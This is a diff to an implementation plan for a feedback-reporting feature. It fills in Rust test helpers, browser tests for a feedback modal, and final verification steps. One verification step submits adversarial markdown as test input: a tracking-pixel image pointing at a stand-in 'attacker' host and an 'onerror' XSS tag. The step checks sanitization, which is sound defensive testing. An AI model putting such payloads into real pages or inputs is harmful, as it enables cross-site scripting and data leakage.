@@ -3403,36 +3403,86 @@ async fn submit_feedback_returns_worker_unreachable_when_no_listener() {
 
 // --- helpers ---------------------------------------------------------------
 
+/// Mint a `ClientHandle<MemNetwork>` with a chosen `feedback_worker`.
+/// Mirrors `test_client()` from `crates/client/src/lib.rs:969` but
+/// adds `feedback_worker` to the produced client's config.
 async fn make_client(
     feedback_worker: Option<willow_identity::EndpointId>,
-) -> (ClientHandle<MemNetwork>, /* event loop join handle */ tokio::task::JoinHandle<()>) {
-    let cfg = ClientConfig {
-        feedback_worker,
-        persistence: false,
-        ..Default::default()
-    };
-    let identity = willow_identity::Identity::generate();
-    // The exact API for spawning a ClientHandle in tests is project-specific —
-    // the implementer follows the pattern in crates/client/src/tests/*.rs,
-    // typically `ClientHandle::<MemNetwork>::new_with(cfg, identity, network)`
-    // or similar. Returns (client, event_loop_handle).
-    todo!("follow existing test_client() helper from crates/client/src/tests/")
+) -> (ClientHandle<MemNetwork>, willow_actor::Addr<willow_actor::Broker<ClientEvent>>) {
+    // `test_client()` builds a fully-configured ClientHandle on a
+    // standalone MemNetwork (no shared hub). Reuse it then patch the
+    // feedback_worker config on the returned handle.
+    let (mut client, broker) = willow_client::test_client();
+    client.set_feedback_worker(feedback_worker);
+    (client, broker)
 }
 
+/// Two-peer fixture: client on a `MemHub`, mock worker on the same
+/// hub that responds to every `WorkerRequest::Feedback` by invoking
+/// `handler`. Pattern adapted from `connected_pair()` in
+/// `crates/client/src/tests/multi_peer_sync.rs` (around line 80).
 async fn spawn_client_and_mock_worker(
     handler: impl Fn(&WorkerRequest) -> WorkerResponse + Send + Sync + 'static,
 ) -> (
     ClientHandle<MemNetwork>,
-    willow_identity::EndpointId,
-    tokio::task::JoinHandle<()>,
-    tokio::task::JoinHandle<()>,
-    std::sync::Arc<MemNetwork>,
+    willow_identity::EndpointId,                                    // worker peer id
+    willow_actor::Addr<willow_actor::Broker<ClientEvent>>,          // client broker
+    tokio::task::JoinHandle<()>,                                    // mock worker task
+    std::sync::Arc<willow_network::mem::MemHub>,                    // shared hub
 ) {
-    todo!("reuse the multi-peer test harness from crates/client/src/tests/multi_peer_sync.rs")
+    use willow_common::{pack_wire, unpack_wire, WireMessage, WorkerWireMessage};
+    use willow_network::mem::{MemHub, MemNetwork};
+    use willow_network::{Network, TopicEvents};
+
+    let hub = std::sync::Arc::new(MemHub::new());
+
+    // Client on the hub.
+    let client_net = MemNetwork::new(&hub);
+    let (mut client, broker) = willow_client::test_client_on_hub(client_net.clone()).await;
+    // Pick a fixed peer ID for the mock worker.
+    let worker_identity = willow_identity::Identity::generate();
+    let worker_peer = worker_identity.endpoint_id();
+    client.set_feedback_worker(Some(worker_peer));
+
+    // Mock worker on the hub: subscribe to `_willow_workers`, decode
+    // each request, invoke `handler`, broadcast the response.
+    let worker_net = MemNetwork::new(&hub);
+    let topic = worker_net
+        .subscribe(willow_common::WORKERS_TOPIC.to_string())
+        .await
+        .expect("subscribe");
+    let handler = std::sync::Arc::new(handler);
+    let task = tokio::spawn(async move {
+        let mut events = topic.events();
+        while let Some(ev) = events.next().await {
+            let willow_network::traits::TopicEvent::Received(msg) = ev else { continue };
+            let Some((decoded, _signer)) = unpack_wire(&msg.content) else { continue };
+            let WireMessage::Worker(WorkerWireMessage::Request {
+                request_id,
+                target_peer,
+                payload,
+            }) = decoded else { continue };
+            if target_peer != worker_peer { continue }
+            let response = (handler)(&payload);
+            let reply = WorkerWireMessage::Response {
+                request_id,
+                target_peer: msg.sender,
+                payload: Box::new(response),
+            };
+            let bytes = pack_wire(&WireMessage::Worker(reply), &worker_identity)
+                .expect("pack reply");
+            topic.broadcast(bytes::Bytes::from(bytes)).await.ok();
+        }
+    });
+
+    (client, worker_peer, broker, task, hub)
 }
 ```
 
-The two `todo!()` helpers MUST be filled in by following the existing client test harness. The plan can't write them here because the project's helper signatures are project-internal. **The implementer's first concrete action under Step 3 is to read `crates/client/src/tests/multi_peer_sync.rs` (or whichever sibling file currently contains the helpers) and copy-adapt the spawn pattern.**
+Note this fixture depends on two small additions:
+
+1. `Client::set_feedback_worker(&mut self, peer: Option<EndpointId>)` — small setter on `ClientHandle` that stores the peer ID for `submit_feedback` to consume. Add it next to the existing `Client` configuration setters.
+2. `test_client_on_hub(net: MemNetwork)` — a sibling of `test_client()` at `crates/client/src/lib.rs:969` that takes a pre-built network instead of constructing one. If a similar helper already exists (`test_client_on_hub` at line 1235), reuse it; otherwise add it as a 5-line wrapper.
 
 - [ ] **Step 3: Wire the test module into the test list**
 
@@ -3854,56 +3904,123 @@ git commit -m "feat(web): Help & Feedback settings tab + fallback link"
 
 This is the form. State machine is `Idle → Submitting → Success | Failure`. `dedup_id` is held in local component state and only regenerates on "Send another" / form-clear; "Retry" preserves it.
 
-- [ ] **Step 1: Write the failing browser test**
+- [ ] **Step 1: Write the failing browser tests**
 
-Create `crates/web/tests/feedback_modal.rs` (or extend `crates/web/tests/browser.rs` if that's the project pattern). The exact harness is project-specific; reuse the helper that mounts a component and queries the DOM. Each test's intent:
+The project's existing browser tests live in `crates/web/tests/browser.rs` (per CLAUDE.md). Reuse the existing `mount_test(...)` (or whatever the harness is named) helper that mounts a component into a DOM node and returns a handle for query/dispatch. Inspect that file first:
+
+```bash
+grep -n "fn mount_test\|fn tick\|wasm_bindgen_test" crates/web/tests/browser.rs | head -20
+```
+
+Add a new module `feedback_modal` inside `crates/web/tests/browser.rs` (or a new `crates/web/tests/feedback_modal.rs` if the project splits browser tests by topic — check for sibling files). Each test follows this shape:
 
 ```rust
-//! Browser tests for the feedback modal.
+mod feedback_modal {
+    use super::*;
+    use willow_common::FeedbackCategory;
+    use willow_web::components::feedback::FeedbackModal;
 
-use wasm_bindgen_test::*;
-wasm_bindgen_test_configure!(run_in_browser);
+    /// Mount the modal with a stubbed submit handler that returns the
+    /// provided `expected` Result. Use this for state-machine tests.
+    fn mount_with_stub(
+        expected: Result<url::Url, willow_client::feedback::FeedbackError>,
+    ) -> impl /* whatever the harness's mount handle is */ {
+        // Replace `inject_submit_stub` with whatever context-injection
+        // mechanism the modal uses (likely a leptos::provide_context
+        // with a custom Submitter trait).
+        crate::mount_test(move || {
+            leptos::provide_context(StubSubmitter::new(expected.clone()));
+            view! { <FeedbackModal repo="x/y".to_string() on_close=move || {} /> }
+        })
+    }
 
-#[wasm_bindgen_test]
-fn modal_renders_form_fields() {
-    // Mount FeedbackModal with a mock submit handler.
-    // Assert: title input, category dropdown, body textarea,
-    // diagnostics checkbox, submit button, cancel button all present.
-    todo!("follow crates/web/tests/browser.rs harness")
-}
+    #[wasm_bindgen_test]
+    fn modal_renders_form_fields() {
+        let h = mount_with_stub(Err(FeedbackError::Internal("unused".into())));
+        assert!(h.query_selector("input[name='title']").is_some());
+        assert!(h.query_selector("select[name='category']").is_some());
+        assert!(h.query_selector("textarea[name='body']").is_some());
+        assert!(h.query_selector("input[type='checkbox'][name='include_diagnostics']").is_some());
+        assert!(h.query_selector("button.feedback-submit").is_some());
+        assert!(h.query_selector("button.feedback-cancel").is_some());
+    }
 
-#[wasm_bindgen_test]
-fn submit_disabled_when_title_empty() {
-    todo!()
-}
+    #[wasm_bindgen_test]
+    fn submit_disabled_when_title_empty() {
+        let h = mount_with_stub(Err(FeedbackError::Internal("unused".into())));
+        let submit = h.query_selector("button.feedback-submit").unwrap();
+        assert!(submit.has_attribute("disabled"));
+        h.set_input_value("input[name='title']", "ok");
+        h.tick().await;
+        assert!(!submit.has_attribute("disabled"));
+    }
 
-#[wasm_bindgen_test]
-fn other_category_reveals_detail_input() {
-    todo!()
-}
+    #[wasm_bindgen_test]
+    async fn other_category_reveals_detail_input() {
+        let h = mount_with_stub(Err(FeedbackError::Internal("unused".into())));
+        assert!(h.query_selector("input[name='category_detail']").is_none());
+        h.set_select_value("select[name='category']", "other");
+        h.tick().await;
+        assert!(h.query_selector("input[name='category_detail']").is_some());
+    }
 
-#[wasm_bindgen_test]
-fn diagnostics_disclosure_renders_exact_value() {
-    todo!()
-}
+    #[wasm_bindgen_test]
+    async fn diagnostics_disclosure_renders_exact_value() {
+        let h = mount_with_stub(Err(FeedbackError::Internal("unused".into())));
+        h.click("details.diagnostics-disclosure summary");
+        h.tick().await;
+        let txt = h.text("details.diagnostics-disclosure");
+        assert!(txt.contains(env!("CARGO_PKG_VERSION")));
+        // build_hash is option_env, so tolerate missing in dev.
+    }
 
-#[wasm_bindgen_test]
-fn rate_limited_failure_shows_retry_after_minutes() {
-    // Mock client returns FeedbackError::RateLimited { retry_after_ms: 720_000 }
-    // Assert: failure inline text mentions "12 minutes".
-    todo!()
-}
+    #[wasm_bindgen_test]
+    async fn rate_limited_failure_shows_retry_after_minutes() {
+        let h = mount_with_stub(Err(FeedbackError::RateLimited { retry_after_ms: 720_000 }));
+        h.set_input_value("input[name='title']", "t");
+        h.set_input_value("textarea[name='body']", "b");
+        h.click("button.feedback-submit");
+        h.tick().await;
+        let err_text = h.text(".feedback-failure");
+        assert!(err_text.contains("12 minutes"), "got: {err_text}");
+    }
 
-#[wasm_bindgen_test]
-fn send_another_clears_dedup_id() {
-    todo!()
-}
+    #[wasm_bindgen_test]
+    async fn send_another_clears_dedup_id() {
+        let h = mount_with_stub(Ok("https://github.com/x/y/issues/1".parse().unwrap()));
+        // First submission.
+        h.set_input_value("input[name='title']", "t");
+        h.set_input_value("textarea[name='body']", "b");
+        h.click("button.feedback-submit");
+        h.tick().await;
+        let dedup_first = h.read_test_data("dedup_id");
+        // Click "Send another".
+        h.click(".feedback-send-another");
+        h.tick().await;
+        let dedup_second = h.read_test_data("dedup_id");
+        assert_ne!(dedup_first, dedup_second);
+    }
 
-#[wasm_bindgen_test]
-fn retry_preserves_dedup_id() {
-    todo!()
+    #[wasm_bindgen_test]
+    async fn retry_preserves_dedup_id() {
+        let h = mount_with_stub(Err(FeedbackError::Timeout));
+        h.set_input_value("input[name='title']", "t");
+        h.set_input_value("textarea[name='body']", "b");
+        h.click("button.feedback-submit");
+        h.tick().await;
+        let dedup_first = h.read_test_data("dedup_id");
+        h.click(".feedback-retry");
+        h.tick().await;
+        let dedup_second = h.read_test_data("dedup_id");
+        assert_eq!(dedup_first, dedup_second);
+    }
 }
 ```
+
+The implementer adapts:
+1. The `StubSubmitter` glue — Leptos `provide_context` or however the modal accepts a substitute submit channel for tests.
+2. The `h.read_test_data("dedup_id")` method — add a `data-test-dedup-id` attribute on the modal root when `cfg!(any(test, feature = "test-utils"))` is set so the test can assert on it. This is a dev-only DOM crumb; it disappears in release builds.
+3. The selectors (`.feedback-failure`, `.feedback-submit`, etc.) — match whatever class names the modal actually renders.
 
 - [ ] **Step 2: Run the browser tests, verify failure**
 
@@ -4403,5 +4520,157 @@ Expected: pass.
 git add justfile
 git commit -m "feat(justfile): test-feedback, build-feedback, docker-ids feedback"
 ```
+
+---
+
+## Phase 6: Final verification + handoff
+
+**Why now:** every component compiles and tests pass individually. We run the full quality gate one last time and validate the dev stack end-to-end.
+
+### Task 6.1: Full quality gate
+
+**Files:** none (verification only)
+
+- [ ] **Step 1: Run the project-wide check**
+
+Run: `just check`
+Expected: fmt + clippy + tests + WASM all pass with zero warnings. This is the ship gate.
+
+If clippy flags anything, fix it inline before continuing — the project policy is zero warnings.
+
+- [ ] **Step 2: Run browser tests**
+
+Run: `just test-browser`
+Expected: pass.
+
+- [ ] **Step 3: Run worker tests**
+
+Run: `just test-workers`
+Expected: pass.
+
+- [ ] **Step 4: Run client tests**
+
+Run: `just test-client`
+Expected: pass.
+
+- [ ] **Step 5: Inspect WASM bundle for placeholder leakage**
+
+Verify the production bundle still contains the `__INJECT_*__` tokens (so the entrypoint can substitute them):
+
+```bash
+cd crates/web && trunk build --release && grep -c '__INJECT_FEEDBACK_PEER_ID__\|__INJECT_RELAY_URL__' dist/init.js
+```
+
+Expected: 4 (each placeholder appears twice in the file — once in the assignment and once in the equality check).
+
+- [ ] **Step 6: No commit (verification only)**
+
+If anything fails, fix it inline; don't proceed past this task with red CI.
+
+### Task 6.2: Live dev-stack smoke test
+
+**Files:** none (verification only)
+
+- [ ] **Step 1: Reset and start the dev stack**
+
+Run: `just dev-clean && just dev`
+Expected: relay, replay, storage, feedback, web all start.
+
+- [ ] **Step 2: Verify the feedback peer ID is wired through**
+
+In a fresh terminal:
+
+```bash
+cat crates/web/dev_assets/feedback-peer-id.txt
+# Expect: a non-empty bech32 string starting with the project's
+# bech32 prefix.
+
+curl -sSf http://localhost:8080/dev_assets/feedback-peer-id.txt
+# Expect: same value (served by trunk).
+```
+
+- [ ] **Step 3: Exercise the UI**
+
+Open `http://localhost:8080` in a browser. Navigate to Settings → Help. Verify:
+
+1. The "Send Feedback" button is enabled (not the "not configured" state).
+2. Clicking opens the modal.
+3. Title, body, category, diagnostics checkbox all visible.
+4. Diagnostics disclosure shows the exact `FeedbackDiagnostics` value.
+5. The privacy notice below Submit is visible.
+6. The fallback "file an issue on GitHub directly" link is present and points to `https://github.com/intendednull/willow/issues/new?...`.
+7. Submitting a test report (`title="dev test"`, `body="hello"`) returns the `Unconfigured` failure state with a graceful inline error (the dev worker has no PAT — this is expected).
+8. The fallback link works (opens a real GitHub issue draft when clicked).
+
+- [ ] **Step 4: Verify the worker logs the structured request line**
+
+In the dev terminal, the feedback worker output includes a line like:
+
+```
+[feedback] INFO feedback_request id=<request_id> signer=<bech32 prefix>… category=Bug body_len=5 dedup=<hex8> github_status=unconfigured latency_ms=<small>
+```
+
+The `github_status=unconfigured` confirms the dev path. The PAT, salt, title, and body must NOT appear in the log line.
+
+- [ ] **Step 5: Validate sanitization end-to-end**
+
+Submit a feedback report with the body containing adversarial markdown:
+
+```
+@everyone please look
+![pixel](https://attacker/?ip=)
+<img onerror=alert(1)>
+```
+
+The dev worker is in `Unconfigured` state so nothing is posted to GitHub, but the worker's request log still emits the structured line — the `body_len` should reflect the input bytes. (The actual sanitization assertion was covered by unit tests; this step just confirms the data path is intact.)
+
+- [ ] **Step 6: Stop the dev stack and clean up**
+
+`Ctrl+C` to stop services. `just dev-clean` to reset.
+
+- [ ] **Step 7: No commit (verification only)**
+
+### Task 6.3: Final spec-coverage review (no code; verification only)
+
+**Files:** none
+
+- [ ] **Step 1: Walk every spec section, confirm a task implemented it**
+
+Open `docs/specs/2026-04-27-feedback-system-design.md` side by side with this plan. For each numbered/bullet requirement, confirm:
+
+- §"New crate `willow-feedback`" → Task 2.1 (scaffold) + 2.2-2.9 (modules).
+- §"Async trait change" → Task 1.3.
+- §"Wire types" → Tasks 1.1, 1.2.
+- §"Reporter peer ID via signer parameter" → Task 1.3 + 2.8 (role uses signer).
+- §"Per-variant size cap" → Task 2.8 (`validate_request`).
+- §"Client API" → Tasks 3.1, 3.2.
+- §"Web UI" → Tasks 4.1, 4.2.
+- §"Failure-state copy" → Task 4.2 (modal renders the table verbatim).
+- §"Configuration mechanism" (`__WILLOW_FEEDBACK_PEER_ID`) → Tasks 5.1, 5.2.
+- §"GitHub issue format" sanitization → Tasks 2.2 (sanitize), 2.8 (assemble).
+- §"Reporter handle" → Task 2.3.
+- §"Salt rotation runbook" → documented in spec; deployment runbook lives there, no implementation required beyond Task 2.5 + entrypoint at 5.3.
+- §"Abuse protection" → Task 2.4 (rate limiter), 2.6 (throttle), 2.8 (cooldown + 401 transition + idempotency cache).
+- §"Deployment" → Tasks 5.2-5.6.
+- §"Observability" → Task 2.8 (one structured log per request) + Task 6.2 step 4 (verification).
+- §"Forward compatibility" → trade-off documented in spec; behavioral verification not required (the bincode behavior is established).
+- §"Testing" matrix:
+  - `willow-common` round-trips → Tasks 1.1, 1.2.
+  - `willow-feedback` role tests → Task 2.8.
+  - `willow-feedback` GitHub-client tests → Task 2.7.
+  - `willow-client` tests → Task 3.2.
+  - `willow-web` browser tests → Task 4.2.
+
+If any spec line has no corresponding task, **stop and add the missing task** — don't ship a half-implemented spec.
+
+- [ ] **Step 2: Push the final branch**
+
+```bash
+git push -u origin claude/add-feedback-system-XP7YR
+```
+
+- [ ] **Step 3: (Optional) Open the PR**
+
+Only if the user explicitly asks. Per repo convention, do not auto-open PRs.
 
 
